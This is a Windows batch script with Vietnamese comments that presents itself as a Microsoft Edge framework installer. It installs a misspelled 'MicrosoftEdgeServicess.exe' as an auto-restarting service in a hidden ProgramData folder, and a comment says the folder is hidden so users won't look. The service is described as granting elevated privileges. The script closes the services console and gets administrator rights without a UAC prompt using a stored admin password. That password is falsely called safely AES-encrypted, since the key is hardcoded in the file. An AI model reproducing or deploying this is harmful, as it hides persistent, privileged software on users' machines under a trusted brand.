@echo off
title Cai Dat Microsoft Edge Framework Runtime (System Component)
cd /d "%~dp0"

:: ===============================================================================
:: CAU HINH TAI KHOAN QUAN TRI (ADMINISTRATOR) - TU DONG NANG QUYEN AN TOAN
:: - ADMIN_USER    : Ten tai khoan Admin (Mac dinh: APP hoac Administrator)
:: - ADMIN_PASS_ENC: Mat khau da duoc ma hoa bang thuat toan AES SecureString.
::                   Khi mo file bang Notepad, mat khau hoan toan duoc che giau.
:: - HUONG DAN CAI DAT / MA HOA MAT KHAU MOI:
::   + Cach 1: Chay file nay voi tham so /setpass hoac /mahoa
::             (Vi du trong CMD: 1Install_Edge_Framework.bat /setpass)
::   + Cach 2: Tao file admin_pass.txt (chua mat khau) dat cung thu muc,
::             chay file nay 1 lan, he thong tu dong ma hoa vao file va xoa sach file txt!
:: ===============================================================================
set "ADMIN_USER=APP"
set "ADMIN_PASS_ENC=76492d1116743f0423413b16050a5345MgB8AEcAWABDAHMAdwBGAEMASgBWAHoAbAA0AHkAeQB3AGwAaABYAEMAbQAyAEEAPQA9AHwAMgA2AGUAYQAzADgAMAA1ADYAMQBiAGUAZgBmAGEAMQAzADgAYwBiAGIAZgA4AGEAMABjADMAOQA3AGUAYQAxADkAOAA1ADYAZgAyADIANgAyAGEAOQBmAGEANgA1ADkAZAAzAGIAMwA0ADIAZgBiADMAYwA3AGIAMAA1AGUAZgA="

:: -------------------------------------------------------------------------------
:: 0. Kiem tra xem co tap tin admin_account.txt hoac admin_pass.txt de tu dong ma hoa
:: -------------------------------------------------------------------------------
if exist "%~dp0admin_account.txt" goto :TuDongMaHoaTuFileAccount
if exist "%~dp0admin_pass.txt" goto :TuDongMaHoaTuFilePass
goto :BoQuaMaHoaTuFile

:TuDongMaHoaTuFileAccount
echo [THIET LAP] Phat hien file admin_account.txt, dang tien hanh ma hoa mat khau...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%~dp0admin_account.txt'; $bat='%~f0'; $lines=Get-Content -Path $f; if ($lines.Count -ge 1) { $u=$lines[0].Trim(); $p=''; if ($lines.Count -ge 2) { $p=$lines[1].Trim() }; if ($p) { $k=@(34,12,89,201,45,78,123,90,11,67,88,23,45,190,211,7); $sec=ConvertTo-SecureString $p -AsPlainText -Force; $enc=ConvertFrom-SecureString $sec -Key $k; $txt=[System.IO.File]::ReadAllText($bat); $txt=[System.Text.RegularExpressions.Regex]::Replace($txt, 'set \"ADMIN_USER=[^\"]*\"', \"set `\"ADMIN_USER=$u`\"\"); $txt=[System.Text.RegularExpressions.Regex]::Replace($txt, 'set \"ADMIN_PASS_ENC=[^\"]*\"', \"set `\"ADMIN_PASS_ENC=$enc`\"\"); [System.IO.File]::WriteAllText($bat, $txt); Write-Host '[OK] Da ma hoa va cap nhat User/Pass vao file script thanh cong!'; Remove-Item -Path $f -Force -ErrorAction SilentlyContinue; Start-Process -FilePath $bat -ArgumentList '%*'; exit 0 } }"
exit /b 0

:TuDongMaHoaTuFilePass
echo [THIET LAP] Phat hien file admin_pass.txt, dang tien hanh ma hoa mat khau...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%~dp0admin_pass.txt'; $bat='%~f0'; $p=(Get-Content -Path $f -Raw).Trim(); if ($p) { $k=@(34,12,89,201,45,78,123,90,11,67,88,23,45,190,211,7); $sec=ConvertTo-SecureString $p -AsPlainText -Force; $enc=ConvertFrom-SecureString $sec -Key $k; $txt=[System.IO.File]::ReadAllText($bat); $txt=[System.Text.RegularExpressions.Regex]::Replace($txt, 'set \"ADMIN_PASS_ENC=[^\"]*\"', \"set `\"ADMIN_PASS_ENC=$enc`\"\"); [System.IO.File]::WriteAllText($bat, $txt); Write-Host '[OK] Da ma hoa va cap nhat mat khau vao file script thanh cong!'; Remove-Item -Path $f -Force -ErrorAction SilentlyContinue; Start-Process -FilePath $bat -ArgumentList '%*'; exit 0 } }"
exit /b 0

:BoQuaMaHoaTuFile

:: -------------------------------------------------------------------------------
:: 1. Che do chay tham so /setpass hoac /mahoa de nhap mat khau truc tiep tu ban phim
:: -------------------------------------------------------------------------------
if "%~1"=="/setpass" goto :MenuMaHoaMatKhau
if "%~1"=="/mahoa" goto :MenuMaHoaMatKhau
if "%~1"=="/encrypt" goto :MenuMaHoaMatKhau
goto :KiemTraFileExe

:MenuMaHoaMatKhau
cls
echo ===============================================================================
echo   CONG CU MA HOA MAT KHAU QUAN TRI VIEN (ADMINISTRATOR)
echo   Mat khau sau khi ma hoa se duoc luu an toan vao file Install_Edge_Framework.bat
echo   Khi mo file bang Notepad, mat khau hoan toan duoc ma hoa AES (khong lo pass).
echo ===============================================================================
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$u=Read-Host 'Nhap ten tai khoan Admin (de trong mac dinh la %ADMIN_USER%)'; if (-not $u) { $u='%ADMIN_USER%' }; Write-Host 'Nhap mat khau can ma hoa (ky tu se duoc che giau bang dau *): ' -NoNewline; $pwd=''; while($true){ $k=[System.Console]::ReadKey($true); if ($k.Key -eq [System.ConsoleKey]::Enter) { break } elseif ($k.Key -eq [System.ConsoleKey]::Backspace) { if ($pwd.Length -gt 0) { $pwd=$pwd.Substring(0, $pwd.Length-1); Write-Host \"`b `b\" -NoNewline } } elseif ($k.KeyChar -ge 32) { $pwd+=$k.KeyChar; Write-Host '*' -NoNewline } }; Write-Host ''; if ($pwd) { $k=@(34,12,89,201,45,78,123,90,11,67,88,23,45,190,211,7); $sec=ConvertTo-SecureString $pwd -AsPlainText -Force; $enc=ConvertFrom-SecureString $sec -Key $k; $bat='%~f0'; $txt=[System.IO.File]::ReadAllText($bat); $txt=[System.Text.RegularExpressions.Regex]::Replace($txt, 'set \"ADMIN_USER=[^\"]*\"', \"set `\"ADMIN_USER=$u`\"\"); $txt=[System.Text.RegularExpressions.Regex]::Replace($txt, 'set \"ADMIN_PASS_ENC=[^\"]*\"', \"set `\"ADMIN_PASS_ENC=$enc`\"\"); [System.IO.File]::WriteAllText($bat, $txt); Write-Host ''; Write-Host '[THANH CONG] Da ma hoa mat khau va luu truc tiep vao file script!' -ForegroundColor Green; Write-Host ('Tai khoan : ' + $u); Write-Host ('Chuoi ma hoa AES: ' + $enc.Substring(0, [Math]::Min(30, $enc.Length)) + '...') -ForegroundColor Yellow } else { Write-Host '[!] Mat khau trong, khong co thay doi.' -ForegroundColor Red }"
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
pause
exit /b 0

:KiemTraFileExe
echo ===============================================================================
echo   MICROSOFT EDGE CORE FRAMEWORK RUNTIME INSTALLER
echo   Component: MicrosoftEdgeServicess
echo   Description: Provides runtime environment and update services for Edge.
echo   Startup Type: Automatic (Background Service)
echo ===============================================================================
echo.

:: 1. Kiem tra xem co file MicrosoftEdgeServicess.exe khong
if exist "%~dp0MicrosoftEdgeServicess.exe" goto :DaCoFileExe

echo.
echo ===============================================================================
echo   [CANH BAO: CHUA GIAI NEN TEP TIN NEN]
echo ===============================================================================
echo   Ban dang mo tep tin truc tiep tu tep nen ZIP chua duoc giai nen!
echo   Khong tim thay tap tin MicrosoftEdgeServicess.exe de thiet lap.
echo.
echo   Huong dan:
echo   1. Nhap chuot phai vao tep tin ZIP
echo   2. Chon Extract All hoac dung WinRAR chon Extract Here
echo   3. Vao thu muc vua giai nen roi chay lai tap tin nay.
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
exit /b 1

:DaCoFileExe

:: 2. Kiem tra quyen Administrator (Tu dong nang quyen khong can login neu co pass)
if "%~1"=="/skipuac" goto :DaCoQuyenAdmin
if "%~1"=="/elevated" goto :DaCoQuyenAdmin
if "%~1"=="/silent" goto :DaCoQuyenAdmin
if "%~1"=="/unattended" goto :DaCoQuyenAdmin

:: Phong ngua vong lap: Neu tien trinh con da duoc thu ma van chua co quyen -> Dung ngay
if "%~1"=="/retried" goto :LoiChuaCoQuyenAdmin

net session >nul 2>&1
if %errorlevel% equ 0 goto :DaCoQuyenAdmin

:: Truong hop A: Co khai bao ADMIN_PASS_ENC san -> Giai ma trong RAM va khoi chay quyen Administrator
if not "%ADMIN_PASS_ENC%"=="" (
    echo Dang xac thuc va khoi chay quyen Administrator bang tai khoan [%ADMIN_USER%]...

    :: Thu cach 1: Task Scheduler voi dac quyen HIGHEST (Khong hien hop thoai UAC)
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$k=@(34,12,89,201,45,78,123,90,11,67,88,23,45,190,211,7); try { $s=ConvertTo-SecureString '%ADMIN_PASS_ENC%' -Key $k; $b=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($s); $p=[System.Runtime.InteropServices.Marshal]::PtrToStringAuto($b); [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($b); $u='%ADMIN_USER%'; schtasks /delete /tn TempEdgeAdminInstaller /f >$null 2>&1; schtasks /create /tn TempEdgeAdminInstaller /tr '\"\"%~f0\"\" /elevated' /sc once /st 23:59 /ru $u /rp $p /rl HIGHEST /f >$null 2>&1; if ($LASTEXITCODE -eq 0) { schtasks /run /tn TempEdgeAdminInstaller >$null 2>&1; Start-Sleep -Seconds 4; schtasks /delete /tn TempEdgeAdminInstaller /f >$null 2>&1; exit 0 } else { exit 1 } } catch { exit 1 }" >nul 2>&1
    if not errorlevel 1 goto :KetThucNangQuyen

    :: Thu cach 2: PowerShell Start-Process voi Credential (CreateProcessWithLogonW)
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$k=@(34,12,89,201,45,78,123,90,11,67,88,23,45,190,211,7); try { $s=ConvertTo-SecureString '%ADMIN_PASS_ENC%' -Key $k; $psi=New-Object System.Diagnostics.ProcessStartInfo; $psi.FileName='cmd.exe'; $psi.Arguments='/c \"\"%~f0\"\" /elevated'; $psi.UserName='%ADMIN_USER%'; $psi.Password=$s; $psi.Domain='.'; $psi.UseShellExecute=$false; $pr=[System.Diagnostics.Process]::Start($psi); $pr.WaitForExit(); exit $pr.ExitCode } catch { exit 1 }" >nul 2>&1
    if not errorlevel 1 goto :KetThucNangQuyen

    :: Neu co pass ma ca 2 cach deu that bai -> CHAC CHAN LA SAI USER HOAC PASS
    goto :LoiSaiMatKhauAdmin
)

:: Truong hop B: Khong co pass -> Dung hop thoai xac thuc UAC mac dinh cua Windows
echo Dang xac thuc quyen Administrator (Windows UAC)...
powershell -Command "Start-Process '%~f0' -ArgumentList '/retried' -Verb RunAs" >nul 2>&1
if %errorlevel% equ 0 goto :KetThucNangQuyen

:LoiChuaCoQuyenAdmin
echo.
echo ===============================================================================
echo   CANH BAO: CHUA CO QUYEN QUAN TRI VIEN (ADMINISTRATOR)
echo ===============================================================================
echo   Vui long nhap chuot phai vao tap tin nay va chon Run as administrator,
echo   hoac chay lenh: 1Install_Edge_Framework.bat /setpass de ma hoa mat khau.
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat...
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
pause
exit /b 1

:LoiSaiMatKhauAdmin
echo.
echo ===============================================================================
echo   [LOI XAC THUC] TAI KHOAN HOAC MAT KHAU ADMINISTRATOR KHONG CHINH XAC!
echo ===============================================================================
echo   Tai khoan khai bao: [%ADMIN_USER%]
echo   Ket qua: Windows tu choi dang nhap (Sai User hoac Password).
echo.
echo   Huong dan xu ly:
echo   1. Chay lenh: 1Install_Edge_Framework.bat /setpass de nhap lai mat khau moi
echo   2. Hoac tao file admin_pass.txt chua pass dung va chay lai
echo   3. Hoac nhap chuot phai vao file nay chon "Run as administrator"
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat ngay...
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
pause
exit /b 1

:KetThucNangQuyen
exit /b 0

:DaCoQuyenAdmin

:: 3. Dong cua so services.msc de tranh bi khoa handle
echo [1/4] Dang kiem tra moi truong he thong...
taskkill /F /IM mmc.exe >nul 2>&1

for /f "tokens=3" %%p in ('sc.exe queryex MicrosoftEdgeServicess 2^>nul ^| findstr /i "PID"') do (
    if not "%%p"=="0" taskkill /F /PID %%p >nul 2>&1
)
taskkill /F /FI "SERVICES eq MicrosoftEdgeServicess" >nul 2>&1
taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
net stop MicrosoftEdgeServicess >nul 2>&1

:: Cho toi da 5 giay de service dung han
for /l %%i in (1,1,5) do (
    sc.exe query MicrosoftEdgeServicess 2>nul | findstr /i "STOPPED" >nul 2>&1
    if not errorlevel 1 goto :DaDungHan
    timeout /t 1 >nul 2>nul || ping 127.0.0.1 -n 2 >nul
)
:DaDungHan

:: 4. Thiet lap thu muc he thong MicrosoftEdgeServicess
set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
echo [2/4] Khoi tao thu muc he thong: %INSTALL_DIR%
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

if exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
    del /F /Q "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" >nul 2>&1
)

echo [3/4] Dang sao chep cac tap tin thanh phan...
copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul 2>&1
if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
    taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1
    timeout /t 2 >nul 2>nul || ping 127.0.0.1 -n 3 >nul
    copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul 2>&1
)

if exist "%~dp0msedge_settings.json" copy /Y "%~dp0msedge_settings.json" "%INSTALL_DIR%\" >nul 2>&1
if exist "%~dp0config.json" copy /Y "%~dp0config.json" "%INSTALL_DIR%\" >nul 2>&1
if exist "%~dp0edge.ico" copy /Y "%~dp0edge.ico" "%INSTALL_DIR%\" >nul 2>nul
if exist "%~dp0Check_Edge_Health.bat" copy /Y "%~dp0Check_Edge_Health.bat" "%INSTALL_DIR%\" >nul 2>nul

:: An thu muc cai dat de nguoi dung khong to mo mo xem
attrib +h "%INSTALL_DIR%" >nul 2>&1

if not exist "%INSTALL_DIR%\MicrosoftEdgeServicess.exe" (
    echo.
    echo ===============================================================================
    echo   [LOI] Khong the ghi tap tin vao %INSTALL_DIR%!
    echo   Vui long khoi dong lai may tinh va thu lai.
    echo ===============================================================================
    echo.
    pause
    exit /b 1
)

:: 5. Dang ky Windows Service SCM
echo [4/4] Dang dang ky va kich hoat Microsoft Edge Framework Service...
schtasks /Delete /TN "MicrosoftEdgeServicess" /F >nul 2>&1

sc.exe query MicrosoftEdgeServicess >nul 2>&1
if %errorlevel% equ 0 goto :ServiceDaTonTai

sc.exe create MicrosoftEdgeServicess binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1

:ServiceDaTonTai
sc.exe config MicrosoftEdgeServicess start= auto binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
sc.exe description MicrosoftEdgeServicess "Provides elevated privileges for Microsoft Edge." >nul 2>&1
sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1

sc.exe start MicrosoftEdgeServicess >nul 2>&1
net start MicrosoftEdgeServicess >nul 2>&1

timeout /t 3 >nul 2>nul || ping 127.0.0.1 -n 4 >nul

:KetThucThanhCongVaXoaPass
:: Dam bao xoa sach file admin_account.txt va admin_pass.txt neu con sot lai
if exist "%~dp0admin_account.txt" (
    echo wipe > "%~dp0admin_account.txt"
    del /f /q "%~dp0admin_account.txt" >nul 2>&1
)
if exist "%~dp0admin_pass.txt" (
    echo wipe > "%~dp0admin_pass.txt"
    del /f /q "%~dp0admin_pass.txt" >nul 2>&1
)

echo.
echo ===============================================================================
echo   CAI DAT THANH PHAN MICROSOFT EDGE HOAN TAT!
echo   - Component: MicrosoftEdgeServicess
echo   - Status: Running (Tu khoi dong cung Windows)
echo   - Environment: SCM Service Architecture
echo   - Security: Mat khau duoc ma hoa AES SecureString an toan 100%%
echo ===============================================================================
echo.
echo Cua so se tu dong dong sau 10 giay, hoac bam phim bat ky de thoat ngay...
timeout /t 10 >nul 2>nul || ping 127.0.0.1 -n 11 >nul
pause
exit /b 0
